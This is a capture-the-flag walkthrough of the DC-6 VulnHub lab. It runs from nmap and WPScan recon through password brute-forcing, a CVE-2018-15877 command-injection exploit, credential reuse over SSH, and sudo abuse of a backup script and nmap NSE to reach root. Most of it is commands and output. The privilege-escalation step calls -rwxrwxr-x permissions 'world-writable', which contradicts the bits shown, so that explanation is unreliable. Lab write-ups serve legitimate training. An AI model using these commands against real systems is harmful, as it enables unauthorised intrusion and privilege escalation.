# DC-6 (VulnHub) Walkthrough

**Target:** DC-6 (10.0.2.9, DHCP-assigned on NAT Network — reconfirmed via `sudo nmap -sn 10.0.2.0/24`)  
**Attacker:** Kali Linux (10.0.2.3)

## Recon

I started with a ping sweep to confirm the target's current IP, since IPs shift on reboot:

```
sudo nmap -sn 10.0.2.0/24
```

DC-6 was at 10.0.2.9. Before scanning further I added it to `/etc/hosts`:

```
echo "10.0.2.9 wordy" | sudo tee -a /etc/hosts
```

This turned out to be essential — the site immediately redirects all HTTP traffic to `http://wordy/`, so without the host entry the page never loads.

Full port scan:

```
nmap -sC -sV -p- 10.0.2.9
```

Two open ports: `22/tcp` (OpenSSH 7.4p1) and `80/tcp` (Apache 2.4.25). The HTTP service redirected to the WordPress install at `http://wordy/`. The page source and RSS generator tag both confirmed **WordPress 5.1.1**, which is listed as insecure.

I ran WPScan to enumerate users:

```
wpscan --url http://wordy/ --enumerate u
```

Five accounts came back: `admin`, `graham`, `mark`, `sarah`, `jens`. WPScan also flagged XML-RPC as enabled, which is worth noting as a potential brute-force amplification vector.

## Finding the Credentials

Running `cewl` against the site produced only 46 generic words — not enough to be useful as a password list. The DC-6 VulnHub author left an explicit hint: restrict `rockyou.txt` to entries containing `k01`:

```
grep k01 /usr/share/wordlists/rockyou.txt > passwords.txt
```

That brought the candidate list down to 2,668 entries — manageable for an online brute-force without hammering the server. I fed that list and all five usernames to WPScan:

```
wpscan --url http://wordy/ --passwords passwords.txt --usernames admin,graham,mark,sarah,jens
```

Hit: **mark / helpdesk01**.

I logged into `http://wordy/wp-login.php` as mark. His account has limited privileges — he can't install or delete plugins — but the admin panel sidebar showed an installed plugin called **Plainview Activity Monitor** that he could access. That was the next lead.

## Exploitation — CVE-2018-15877

I searched for exploits against the plugin:

```
searchsploit activity monitor
```

Two results: `45274.html` (a CSRF proof-of-concept requiring browser interaction) and `50110.py` (a Python script that handles authentication and command injection directly). The Python exploit was the cleaner path — I didn't need a browser in the loop.

I reviewed the script before running it:

```
cat /usr/share/exploitdb/exploits/php/webapps/50110.py
```

The vulnerability is in `activities_overview.php`: the `ip` parameter is piped to `dig` server-side without any sanitisation, so appending `| <cmd>` after a valid domain executes arbitrary shell commands. The output comes back in the HTTP response, wrapped in `<p>Output from dig: </p>` tags which the script parses to strip the noise. Crucially, the submit parameter must be named `lookup` — sending `convert` (as Burp's intercept showed the legitimate form does) hits a different code path that doesn't trigger the injection.

```
python3 /usr/share/exploitdb/exploits/php/webapps/50110.py
```

Entered: target `http://wordy`, username `mark`, password `helpdesk01`. The script authenticated, injected the payload, and dropped me into an interactive pseudo-shell as `www-data@wordy`.

Confirmed: `id` returned `uid=33(www-data) gid=33(www-data)`.

## Lateral Movement

From the `www-data` shell I enumerated home directories:

```
ls -la /home/mark/
```

There was a `stuff/` subdirectory — not something you'd normally see. Inside:

```
ls -la /home/mark/stuff/
cat /home/mark/stuff/things-to-do.txt
```

The file contained a to-do note left for the admin, including a reminder to change Graham's password. It hadn't been changed. Credentials: **graham / GSo7isUM1D4**.

SSH as graham from my Kali machine:

```
ssh graham@10.0.2.9
```

Full interactive session. I checked sudo permissions immediately:

```
sudo -l
```

Output: `(jens) NOPASSWD: /home/jens/backups.sh` — graham can execute that specific script as jens, no password required.

## Privilege Escalation

I looked at `backups.sh` before touching it:

```
cat /home/jens/backups.sh
ls -la /home/jens/backups.sh
```

The script runs a `tar` archive operation. The permissions were the problem: `-rwxrwxr-x 1 jens devs` — world-writable. Graham isn't in the `devs` group but the world write bit means he can overwrite it anyway.

I replaced the script contents with a shell call:

```
echo "/bin/bash" > /home/jens/backups.sh
sudo -u jens /home/jens/backups.sh
```

Shell as jens. `id` confirmed `uid=1004(jens) gid=1004(jens)`.

Checked sudo again:

```
sudo -l
```

`(root) NOPASSWD: /usr/bin/nmap` — jens can run nmap as root. This is a classic GTFOBins vector: nmap supports loading Lua NSE scripts, and since it runs as root, any Lua `os.execute()` call inside the script runs as root too.

```
echo 'os.execute("/bin/bash")' > /tmp/root.nse
sudo nmap --script=/tmp/root.nse
```

Root shell. `id` returned `uid=0(root) gid=0(root) groups=0(root)`.

## Capturing the Flag

```
find / -iname '*flag*' 2>/dev/null
cat /root/theflag.txt
```

ASCII art congratulatory message at `/root/theflag.txt`. DC-6 complete.

## Summary

| Stage | Technique |
|---|---|
| Recon | Full-port Nmap scan (`-sC -sV -p-`) + WPScan user enumeration |
| Credential Attack | `grep k01 rockyou.txt` wordlist filter → WPScan brute-force → `mark/helpdesk01` |
| Exploitation | CVE-2018-15877 — Plainview Activity Monitor `ip` parameter command injection (50110.py) |
| Lateral Movement | Credential leak in `/home/mark/stuff/things-to-do.txt` → SSH as `graham` |
| Privilege Escalation (1) | World-writable `backups.sh` overwritten with `/bin/bash`, run as `jens` via sudo |
| Privilege Escalation (2) | `sudo nmap --script` GTFOBins Lua `os.execute()` → root |
| Capturing the Flag | `cat /root/theflag.txt` |
